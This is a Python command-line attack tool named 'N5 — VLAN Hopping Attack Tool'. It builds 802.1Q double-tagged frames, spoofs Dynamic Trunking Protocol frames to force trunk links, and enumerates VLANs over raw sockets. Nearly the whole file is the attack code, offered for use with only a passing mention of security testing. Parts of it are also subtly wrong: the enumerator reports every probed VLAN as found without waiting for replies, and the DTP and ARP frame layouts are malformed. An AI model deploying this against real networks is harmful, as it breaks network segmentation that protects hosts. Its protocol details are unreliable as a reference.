#!/usr/bin/env python3
"""
N5 — VLAN Hopping Attack Tool
Double-tagging and DTP spoofing for VLAN security testing.
"""

import argparse
import logging
import socket
import struct
import sys
import threading
import time
from collections import defaultdict

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    datefmt='%H:%M:%S'
)
log = logging.getLogger('vlan-hop')

ETH_P_8021Q = 0x8100
ETH_P_DTP = 0x0142
ETH_P_CDP = 0x2000


class DoubleTagPacket:
    """Crafts 802.1Q double-tagged frames."""

    def __init__(self, src_mac, dst_mac, outer_vlan, inner_vlan,
                 payload=None):
        self.src_mac = bytes.fromhex(src_mac.replace(':', ''))
        self.dst_mac = bytes.fromhex(dst_mac.replace(':', ''))
        self.outer_vlan = outer_vlan
        self.inner_vlan = inner_vlan
        self.payload = payload or b'\x00' * 46

    def build(self):
        """Build double-tagged Ethernet frame."""
        frame = bytearray()
        frame.extend(self.dst_mac)
        frame.extend(self.src_mac)
        frame.extend(struct.pack('!H', ETH_P_8021Q))
        frame.extend(struct.pack('!H', 0 | (self.outer_vlan & 0x0FFF)))
        frame.extend(struct.pack('!H', ETH_P_8021Q))
        frame.extend(struct.pack('!H', 0 | (self.inner_vlan & 0x0FFF)))
        frame.extend(struct.pack('!H', 0x0800))
        frame.extend(self.payload)

        while len(frame) < 64:
            frame.extend(b'\x00')

        return bytes(frame[:64])

    def __len__(self):
        return 64


class DTPPacket:
    """Crafts DTP (Dynamic Trunking Protocol) frames."""

    DTP_HEADER = b'\x01' * 8

    DTP_TLV_TYPES = {
        'DTP Cougar': struct.pack('!H', 0x0001),
        'DTP Status': struct.pack('!H', 0x0002),
        'DTP Voice VLAN': struct.pack('!H', 0x0003),
    }

    def __init__(self, src_mac, mode='auto'):
        self.src_mac = bytes.fromhex(src_mac.replace(':', ''))
        self.mode = mode

    def build(self):
        frame = bytearray()
        dst_mac = bytes.fromhex('01000ccccc00')
        frame.extend(dst_mac)
        frame.extend(self.src_mac)
        frame.extend(struct.pack('!H', ETH_P_DTP))

        frame.extend(self.DTP_HEADER)

        frame.extend(b'\x00\x01')
        frame.extend(struct.pack('!B', 1))

        if self.mode == 'auto':
            frame.extend(b'\x00\x02')
            frame.extend(struct.pack('!B', 2))
        else:
            frame.extend(b'\x00\x02')
            frame.extend(struct.pack('!B', 1))

        frame.extend(b'\x00\x04')
        frame.extend(struct.pack('!B', 0))

        while len(frame) < 64:
            frame.extend(b'\x00')

        return bytes(frame[:64])


class VLANHunter:
    """Enumerates VLANs on a network segment."""

    def __init__(self, interface, src_mac, target_ip='255.255.255.255'):
        self.interface = interface
        self.src_mac = src_mac
        self.target_ip = target_ip
        self.discovered_vlans = set()
        self._lock = threading.Lock()

    def send_vlan_probe(self, vlan_id):
        """Send a probe packet tagged with specific VLAN."""
        log.debug(f"Probing VLAN {vlan_id}")

        try:
            sock = socket.socket(
                socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_8021Q)
            )
            sock.bind((self.interface, 0))

            src = bytes.fromhex(self.src_mac.replace(':', ''))
            dst = bytes.fromhex('ffffffffffff')
            frame = bytearray()
            frame.extend(dst)
            frame.extend(src)
            frame.extend(struct.pack('!H', ETH_P_8021Q))
            frame.extend(struct.pack('!H', 0 | (vlan_id & 0x0FFF)))
            frame.extend(struct.pack('!H', 0x0806))

            arp = bytearray()
            arp.extend(b'\x00\x01')
            arp.extend(struct.pack('!H', 0x0800))
            arp.extend(struct.pack('!B', 6))
            arp.extend(struct.pack('!B', 4))
            arp.extend(struct.pack('!H', 1))
            arp.extend(struct.pack('!H', 0x0800))
            arp.extend(struct.pack('!B', 6))
            arp.extend(struct.pack('!B', 4))
            arp.extend(struct.pack('!H', 2))
            frame.extend(arp)

            while len(frame) < 64:
                frame.extend(b'\x00')

            sock.send(bytes(frame[:64]))
            sock.close()
            return True
        except Exception as e:
            log.debug(f"Probe failed for VLAN {vlan_id}: {e}")
            return False

    def enumerate_vlans(self, vlan_range=None):
        """Enumerate VLANs in given range."""
        if vlan_range is None:
            vlan_range = list(range(1, 100))

        log.info(f"Scanning {len(vlan_range)} VLANs...")

        threads = []
        for vlan_id in vlan_range:
            t = threading.Thread(
                target=self._probe_vlan, args=(vlan_id,)
            )
            threads.append(t)
            t.start()
            time.sleep(0.01)

        for t in threads:
            t.join(timeout=5)

        return sorted(self.discovered_vlans)

    def _probe_vlan(self, vlan_id):
        """Probe a single VLAN."""
        if self.send_vlan_probe(vlan_id):
            with self._lock:
                self.discovered_vlans.add(vlan_id)
                log.info(f"[VLAN FOUND] ID: {vlan_id}")


class DoubleTagAttack:
    """Executes double-tagging (802.1Q-in-802.1Q) attack."""

    def __init__(self, interface, src_mac, outer_vlan,
                 inner_vlan, payload=None):
        self.interface = interface
        self.src_mac = src_mac
        self.outer_vlan = outer_vlan
        self.inner_vlan = inner_vlan
        self.payload = payload
        self.packets_sent = 0

    def craft_packet(self):
        """Craft double-tagged packet."""
        packet = DoubleTagPacket(
            src_mac=self.src_mac,
            dst_mac='ff:ff:ff:ff:ff:ff',
            outer_vlan=self.outer_vlan,
            inner_vlan=self.inner_vlan,
            payload=self.payload
        )
        return packet.build()

    def send(self, count=1, interval=0):
        """Send double-tagged packets."""
        log.info("=== Double-Tagging Attack ===")
        log.info(f"Outer VLAN: {self.outer_vlan}")
        log.info(f"Inner VLAN: {self.inner_vlan}")
        log.info(f"Target VLAN: {self.inner_vlan}")

        packet = self.craft_packet()

        try:
            sock = socket.socket(
                socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003)
            )
            sock.bind((self.interface, 0))
        except PermissionError:
            log.error("Requires root privileges")
            sys.exit(1)

        try:
            for i in range(count):
                sock.send(packet)
                self.packets_sent += 1
                if (i + 1) % 10 == 0:
                    log.info(f"[SENT] {i + 1}/{count} packets")
                if interval > 0:
                    time.sleep(interval)
        except KeyboardInterrupt:
            log.info("\n[INTERRUPTED]")
        finally:
            sock.close()

        log.info(f"[DONE] {self.packets_sent} packets sent")
        return self.packets_sent


class DTPSpoofer:
    """Spoofs DTP frames to negotiate trunk links."""

    def __init__(self, interface, src_mac, mode='auto'):
        self.interface = interface
        self.src_mac = src_mac
        self.mode = mode
        self.packets_sent = 0

    def send(self, count=1, interval=1.0):
        """Send DTP spoofing packets."""
        log.info("=== DTP Spoofing Attack ===")
        log.info(f"Mode: {self.mode}")
        log.info(f"Interface: {self.interface}")

        dtp = DTPPacket(src_mac=self.src_mac, mode=self.mode)
        packet = dtp.build()

        try:
            sock = socket.socket(
                socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003)
            )
            sock.bind((self.interface, 0))
        except PermissionError:
            log.error("Requires root privileges")
            sys.exit(1)

        try:
            for i in range(count):
                sock.send(packet)
                self.packets_sent += 1
                log.info(f"[DTP] Sent DTP frame ({i + 1}/{count})")
                time.sleep(interval)
        except KeyboardInterrupt:
            log.info("\n[INTERRUPTED]")
        finally:
            sock.close()

        log.info(f"[DONE] {self.packets_sent} DTP frames sent")
        return self.packets_sent


def cmd_double_tag(args):
    attack = DoubleTagAttack(
        interface=args.interface,
        src_mac=args.src_mac,
        outer_vlan=args.outer_vlan,
        inner_vlan=args.inner_vlan
    )
    attack.send(count=args.count, interval=args.interval)


def cmd_dtp(args):
    spoofer = DTPSpoofer(
        interface=args.interface,
        src_mac=args.src_mac,
        mode=args.mode
    )
    spoofer.send(count=args.count, interval=args.interval)


def cmd_enum(args):
    hunter = VLANHunter(
        interface=args.interface,
        src_mac=args.src_mac
    )
    vlans = hunter.enumerate_vlans(
        list(range(args.start_vlan, args.end_vlan + 1))
    )
    log.info(f"\n=== Discovered VLANs ===")
    for v in vlans:
        log.info(f"  VLAN {v}")


def main():
    parser = argparse.ArgumentParser(
        description='N5 — VLAN Hopping Attack Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    subparsers = parser.add_subparsers(dest='command', help='Attack type')

    dt = subparsers.add_parser('double-tag',
                               help='Double-tagging attack')
    dt.add_argument('--interface', '-i', required=True,
                    help='Network interface')
    dt.add_argument('--src-mac', required=True,
                    help='Source MAC address')
    dt.add_argument('--outer-vlan', type=int, required=True,
                    help='Outer (native) VLAN tag')
    dt.add_argument('--inner-vlan', type=int, required=True,
                    help='Inner (target) VLAN tag')
    dt.add_argument('--count', type=int, default=10,
                    help='Number of packets (default: 10)')
    dt.add_argument('--interval', type=float, default=0.1,
                    help='Interval between packets (default: 0.1)')
    dt.set_defaults(func=cmd_double_tag)

    dtp = subparsers.add_parser('dtp', help='DTP spoofing attack')
    dtp.add_argument('--interface', '-i', required=True,
                     help='Network interface')
    dtp.add_argument('--src-mac', required=True,
                     help='Source MAC address')
    dtp.add_argument('--mode', choices=['auto', 'trunk', 'access'],
                     default='auto',
                     help='DTP mode (default: auto)')
    dtp.add_argument('--count', type=int, default=10,
                     help='Number of DTP frames (default: 10)')
    dtp.add_argument('--interval', type=float, default=1.0,
                     help='Interval between frames (default: 1.0)')
    dtp.set_defaults(func=cmd_dtp)

    en = subparsers.add_parser('enum', help='VLAN enumeration')
    en.add_argument('--interface', '-i', required=True,
                    help='Network interface')
    en.add_argument('--src-mac', required=True,
                    help='Source MAC address')
    en.add_argument('--start-vlan', type=int, default=1,
                    help='Start VLAN ID (default: 1)')
    en.add_argument('--end-vlan', type=int, default=100,
                    help='End VLAN ID (default: 100)')
    en.set_defaults(func=cmd_enum)

    args = parser.parse_args()
    if not args.command:
        parser.print_help()
        sys.exit(1)

    args.func(args)


if __name__ == '__main__':
    main()
